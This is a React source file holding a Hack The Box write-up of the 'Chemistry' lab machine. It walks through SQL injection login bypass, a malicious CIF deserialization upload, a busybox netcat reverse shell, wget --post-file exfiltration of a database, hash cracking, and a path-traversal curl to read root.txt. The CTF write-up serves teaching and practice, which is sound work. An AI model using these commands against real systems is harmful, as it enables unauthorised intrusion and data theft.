// ✅ src/data/writeups/chemistry.js
import React from "react";
import InjectedImage from "../../components/InjectedImage";

import ChemistryLogo from "../../assets/Chemistry.png";
import IMG1 from "../../assets/chemlogin.png";
import IMG2 from "../../assets/chemcifpayload.png";
import IMG3 from "../../assets/chemconnection.png";
import IMG4 from "../../assets/chemhomedir.png";
import IMG5 from "../../assets/chemserver.png";
import IMG6 from "../../assets/chemdbfiledownload.png";
import IMG7 from "../../assets/chemdbfilecontent.png";
import IMG8 from "../../assets/chemhashcrack.png";
import IMG9 from "../../assets/chemsshconnect.png";
import IMG10 from "../../assets/chemenum.png";
import IMG11 from "../../assets/chemsshrsa.png";
import IMG12 from "../../assets/chempwned.png";
import IMG13 from "../../assets/chem2pwned.png";

export const chemistryWriteup = [
  () => (
    <>
      <h2>🧪 Introduction</h2>
      <InjectedImage imgSrc={ChemistryLogo} alt="Chemistry Logo" />
      <p>
        This write-up walks through the Chemistry machine from Hack The Box. The
        box involves SQL injection, file upload exploitation with CIF parsing,
        reverse shell via object injection, and multiple privilege escalation
        paths.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🔓 SQL Injection Login Bypass</h2>
      <InjectedImage imgSrc={IMG1} alt="Login Page" />
      <p>
        The login form was vulnerable to SQL injection. Logging in with{" "}
        <code>' OR '1'='1' --</code> granted access to the dashboard.
      </p>
    </>
  ),
  () => (
    <>
      <h2>📦 Malicious CIF Payload Upload</h2>
      <InjectedImage imgSrc={IMG2} alt="CIF Payload" />
      <p>
        We uploaded a crafted <code>.cif</code> file abusing Python object
        deserialization inside the <code>pymatgen</code> parser. The payload
        triggered a reverse shell.
      </p>
    </>
  ),
  () => (
    <>
      <h2>📡 Reverse Shell Connected</h2>
      <InjectedImage imgSrc={IMG3} alt="Netcat Connection" />
      <p>
        Listener on port 9001 caught the reverse shell using{" "}
        <code>busybox nc &lt;ip&gt; &lt;port&gt; -e /bin/bash</code>. We gained
        a shell as user <code>app</code>.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🐍 Upgrading Shell & Enumerating</h2>
      <InjectedImage imgSrc={IMG4} alt="Python Shell and Home Directory" />
      <p>
        Upgraded to a fully interactive shell with Python. Began exploring the
        application files and local SQLite database.
      </p>
    </>
  ),
  () => (
    <>
      <h2>📤 Downloading database.db</h2>
      <InjectedImage imgSrc={IMG5} alt="Python HTTP Server" />
      <p>
        Started a local HTTP server and used <code>wget --post-file</code> on
        the target to exfiltrate <code>database.db.1</code>.
      </p>
      <InjectedImage imgSrc={IMG6} alt="Downloaded DB File" />
    </>
  ),
  () => (
    <>
      <h2>🗃️ Exploring SQLite Database</h2>
      <InjectedImage imgSrc={IMG7} alt="Database Content" />
      <p>
        Found multiple usernames and MD5 password hashes stored in the{" "}
        <code>user</code> table.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🔓 Cracking rosa’s Hash</h2>
      <InjectedImage imgSrc={IMG8} alt="Cracked rosa hash" />
      <p>
        We cracked rosa's MD5 hash using <code>hashcat</code>, revealing a valid
        password.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🔑 SSH as rosa</h2>
      <InjectedImage imgSrc={IMG9} alt="SSH into rosa" />
      <p>
        Used the cracked credentials to SSH into the box as <code>rosa</code>.
        This provided access to internal services.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🔍 Enumerating Localhost Port 8080</h2>
      <InjectedImage imgSrc={IMG10} alt="Enumeration of Localhost" />
      <p>
        From inside the rosa shell, we accessed a local Flask web service on{" "}
        <code>localhost:8080</code> which wasn't exposed externally.
      </p>
    </>
  ),
  () => (
    <>
      <h2>🔑 SSH Key Discovery and Root Access</h2>
      <InjectedImage imgSrc={IMG11} alt="SSH Private Key Found" />
      <p>
        Found a private key file on the server and used it to SSH as root,
        gaining full access.
      </p>
      <InjectedImage imgSrc={IMG12} alt="Root Access" />
    </>
  ),
  () => (
    <>
      <h2>📬 Alternate Path to Root via curl</h2>
      <InjectedImage imgSrc={IMG13} alt="Root.txt Retrieved via curl" />
      <p>
        From the <code>rosa</code> user shell, we used{" "}
        <code>
          curl -s --path-as-is
          http://localhost:8080/assets/../../../root/root.txt
        </code>{" "}
        to read the <code>root.txt</code> file directly.
      </p>
    </>
  ),
  () => (
    <>
      <h2>📜 Lessons Learned</h2>
      <ul>
        <li>SQL Injection for authentication bypass</li>
        <li>Abusing CIF parsing with Python object injection</li>
        <li>Creative use of busybox and netcat for reverse shell</li>
        <li>Privilege escalation via database exfiltration and SSH</li>
        <li>Internal service exploitation with path traversal</li>
      </ul>
      <h3>✅ Machine Completed: Chemistry</h3>
      <a href="https://app.hackthebox.com/profile/1984386">9t0wl #1984386</a>
    </>
  ),
];
